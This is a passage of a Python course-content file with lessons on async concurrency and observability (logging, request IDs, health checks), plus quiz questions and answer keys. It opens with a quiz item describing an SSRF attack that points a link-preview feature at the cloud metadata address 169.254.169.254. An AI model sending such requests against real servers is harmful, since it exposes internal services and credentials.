            question("A link-preview feature is tricked into fetching http://169.254.169.254/. Which attack is this?",
                     ["CSRF", "SSRF", "XSS", "Clickjacking"], 1,
                     "Server-side request forgery makes your server call internal addresses that the attacker can't reach directly."),
        ],
    ),
    "be-concurrency": lesson(
        "A server handles many requests at once using processes, threads or an async event loop. Knowing which to use, and how Python's GIL fits in, prevents the most common performance bugs.",
        [
            section(
                "Processes, threads and the event loop",
                "**Processes** have separate memory and run truly in parallel on several CPU cores; production servers run several worker processes (`uvicorn --workers 4`). **Threads** share memory inside one process. In CPython, the **Global Interpreter Lock (GIL)** lets only one thread run Python bytecode at a time, so threads help while waiting for I/O but not with CPU-heavy work (Python 3.13 added an experimental free-threaded build without the GIL). **Async** code runs many tasks on one thread: whenever a task awaits I/O, the event loop runs another, which makes thousands of concurrent connections cheap.",
                r'''
                import asyncio
                import time


                async def fetch(name: str, seconds: float) -> str:
                    await asyncio.sleep(seconds)        # stands in for a network or database call
                    return name


                async def main() -> None:
                    start = time.perf_counter()
                    for name in ("users", "orders", "stock"):
                        await fetch(name, 0.5)
                    print(f"one after another: {time.perf_counter() - start:.1f}s")      # 1.5s

                    start = time.perf_counter()
                    results = await asyncio.gather(fetch("users", 0.5), fetch("orders", 0.5), fetch("stock", 0.5))
                    print(f"concurrently: {time.perf_counter() - start:.1f}s", results)    # 0.5s


                asyncio.run(main())
                ''',
            ),
            section(
                "Never block the event loop",
                "Inside `async def`, a blocking call such as `time.sleep`, `requests.get` or a synchronous database driver freezes the whole event loop, so every other request on that worker waits. Use async libraries (httpx, asyncpg, PyMongo's async client), or move blocking work to a thread with `asyncio.to_thread`. FastAPI runs plain `def` endpoints in a thread pool, so a sync endpoint is safer than an async one that blocks. Send CPU-heavy work to a process pool or a background job queue.",
                r'''
                import asyncio
                import time

                from fastapi import FastAPI

                app = FastAPI()


                @app.get("/bad")
                async def bad():
                    time.sleep(2)                             # blocks every request on this worker
                    return {"ok": True}


                @app.get("/good")
                async def good():
                    await asyncio.to_thread(time.sleep, 2)    # the event loop keeps serving others
                    return {"ok": True}


                @app.get("/also-fine")
                def also_fine():
                    time.sleep(2)                             # sync endpoint: FastAPI runs it in a thread pool
                    return {"ok": True}
                ''',
            ),
        ],
        [
            "Processes give real parallelism; threads and async give concurrency for I/O-bound work.",
            "The GIL lets one thread run Python bytecode at a time, so use processes for CPU-bound work.",
            "Never call blocking functions inside `async def`; use async libraries or `asyncio.to_thread`.",
            "In production, run several worker processes per machine, roughly one per CPU core.",
        ],
        r'''
        import asyncio
        import time


        def blocking_report() -> str:
            time.sleep(1)                     # a slow synchronous library call
            return "report"


        async def heartbeat(stop: asyncio.Event) -> int:
            beats = 0
            while not stop.is_set():
                await asyncio.sleep(0.1)
                beats += 1
            return beats


        async def run(use_thread: bool) -> None:
            stop = asyncio.Event()
            beat_task = asyncio.create_task(heartbeat(stop))
            await asyncio.sleep(0)            # let the heartbeat start
            start = time.perf_counter()
            if use_thread:
                await asyncio.to_thread(blocking_report)
            else:
                blocking_report()             # freezes the event loop
            stop.set()
            beats = await beat_task
            label = "to_thread" if use_thread else "blocking"
            print(f"{label:9}: {time.perf_counter() - start:.1f}s, heartbeats during the call: {beats}")


        async def main() -> None:
            start = time.perf_counter()
            await asyncio.gather(*(asyncio.sleep(0.3) for _ in range(100)))
            print(f"100 concurrent waits of 0.3s took {time.perf_counter() - start:.2f}s")
            await run(use_thread=False)       # about 1 heartbeat: everything else was stuck
            await run(use_thread=True)        # about 10 heartbeats: the loop stayed responsive


        asyncio.run(main())
        ''',
        [
            question("Which approach speeds up CPU-heavy Python work across several cores?",
                     ["More threads", "asyncio", "Multiple processes", "Longer timeouts"], 2,
                     "The GIL stops threads running Python bytecode in parallel; each process has its own interpreter and GIL."),
            question("What happens if an async endpoint calls time.sleep(2)?",
                     ["Only that request waits", "The event loop, and every request on that worker, is blocked for 2 seconds", "FastAPI moves it to a thread automatically", "It raises an error"], 1,
                     "time.sleep never yields to the event loop. Use `await asyncio.sleep` or `asyncio.to_thread`."),
            question("Why is async good for servers that make many slow network calls?",
                     ["It uses more CPU cores", "One thread can switch between thousands of tasks while they wait for I/O", "It removes the GIL", "It makes each call faster"], 1,
                     "Each await hands control back to the event loop, so waiting costs almost nothing."),
        ],
    ),
    "be-observability": lesson(
        "You can't fix what you can't see. Structured logs, metrics and traces show what a server is doing, and health checks let platforms restart or route around unhealthy instances.",
        [
            section(
                "Logs, metrics and traces",
                "**Logs** record events; write them as structured JSON with a request ID, so you can search and join them. **Metrics** are numbers over time, cheap to store and ideal for dashboards and alerts; for services, track the RED metrics: request **R**ate, **E**rrors and **D**uration (latency percentiles such as p95 and p99, not just averages). **Traces** follow one request across services and show where the time went. OpenTelemetry is the standard toolkit for all three.",
                r'''
                import json
                import logging
                import time


                class JsonFormatter(logging.Formatter):
                    def format(self, record: logging.LogRecord) -> str:
                        entry = {"time": time.strftime("%Y-%m-%dT%H:%M:%S"), "level": record.levelname,
                                 "message": record.getMessage()}
                        entry.update(getattr(record, "fields", {}))
                        return json.dumps(entry)


                handler = logging.StreamHandler()
                handler.setFormatter(JsonFormatter())
                log = logging.getLogger("api")
                log.addHandler(handler)
                log.setLevel(logging.INFO)

                log.info("order created", extra={"fields": {"order_id": 101, "request_id": "f3a9c2", "total": 30}})
                ''',
            ),
            section(
                "Request IDs and timing middleware",
                "Middleware sees every request, so it's the right place to assign a request ID (or reuse an incoming `X-Request-ID`), time the request and write one log line with the method, path, status and duration. Return the ID in a response header so users can quote it to support, and pass it on to downstream services.",
                r'''
                import logging
                import time
                import uuid

                from fastapi import FastAPI, Request

                app = FastAPI()
                log = logging.getLogger("api")


                @app.middleware("http")
                async def access_log(request: Request, call_next):
                    request_id = request.headers.get("x-request-id") or uuid.uuid4().hex[:12]
                    start = time.perf_counter()
                    response = await call_next(request)
                    response.headers["X-Request-ID"] = request_id
                    log.info("request", extra={"fields": {
                        "request_id": request_id, "method": request.method, "path": request.url.path,
                        "status": response.status_code, "duration_ms": round((time.perf_counter() - start) * 1000, 1),
                    }})
                    return response
                ''',
            ),
            section(
                "Health checks and graceful shutdown",
                "Platforms such as Kubernetes and Render probe your service. A **liveness** check answers 'is the process stuck?'; failing it restarts the container. A **readiness** check answers 'can I serve traffic right now?'; failing it takes the instance out of the load balancer, for example while it warms up or can't reach the database. Keep liveness simple, so a slow database doesn't trigger a restart storm. On shutdown, stop accepting new requests and finish the ones in flight. Render uses this app's `/api/health` endpoint.",
                r'''
                from fastapi import FastAPI, Response

                app = FastAPI()
                database_ok = True    # in real code: run SELECT 1 with a short timeout


                @app.get("/livez")
                def liveness():
                    return {"status": "alive"}


                @app.get("/readyz")
                def readiness(response: Response):
                    if not database_ok:
                        response.status_code = 503
                        return {"status": "not ready", "database": "unreachable"}
                    return {"status": "ready"}
                ''',
            ),
        ],
        [
            "Logs record events, metrics measure trends, and traces follow one request across services.",
            "Log JSON with a request ID so you can search and correlate.",
            "Alert on request rate, errors and latency percentiles (p95, p99), not averages.",
            "Liveness restarts stuck processes; readiness routes traffic away from instances that can't serve.",
        ],
        r'''
        import json
        import logging
        import sys
        import time
        import uuid

        from fastapi import FastAPI, HTTPException, Request
        from fastapi.testclient import TestClient


        class JsonFormatter(logging.Formatter):
            def format(self, record: logging.LogRecord) -> str:
                return json.dumps({"level": record.levelname, "message": record.getMessage(),
                                   **getattr(record, "fields", {})})


        handler = logging.StreamHandler(sys.stdout)
        handler.setFormatter(JsonFormatter())
        log = logging.getLogger("api")
        log.addHandler(handler)
        log.setLevel(logging.INFO)

        app = FastAPI()


        @app.middleware("http")
        async def access_log(request: Request, call_next):
            request_id = request.headers.get("x-request-id") or uuid.uuid4().hex[:12]
            start = time.perf_counter()
            response = await call_next(request)
            response.headers["X-Request-ID"] = request_id
            log.info("request", extra={"fields": {
                "request_id": request_id, "method": request.method, "path": request.url.path,
                "status": response.status_code, "duration_ms": round((time.perf_counter() - start) * 1000, 2),
            }})
            return response


        @app.get("/orders/{order_id}")
        def get_order(order_id: int):
            if order_id != 1:
                raise HTTPException(404, "Order not found")
            return {"id": 1}


        client = TestClient(app)
        client.get("/orders/1")                     # logs a 200 line with a new request id
        missing = client.get("/orders/2", headers={"X-Request-ID": "support-ticket-77"})
        print("returned header:", missing.headers["x-request-id"])   # support-ticket-77
        ''',
        [
            question("Which is the best signal to alert on for user-facing latency?",
                     ["Average latency", "p95 or p99 latency", "CPU temperature", "The number of log lines"], 1,
                     "Averages hide the slow tail that real users feel; percentiles show it."),
            question("What should happen when a readiness check fails?",
                     ["The container restarts", "The instance stops receiving traffic until it's ready again", "Logs are deleted", "Nothing"], 1,
                     "Restarting is what a failed liveness check does; readiness only controls routing."),
            question("Why add a request ID to every log line?",
                     ["To make logs bigger", "To find every log line for one request, across services", "For encryption", "HTTP requires it"], 1,
                     "With one ID you can filter all the logs a single failing request produced, even across several services."),
        ],
    ),
}
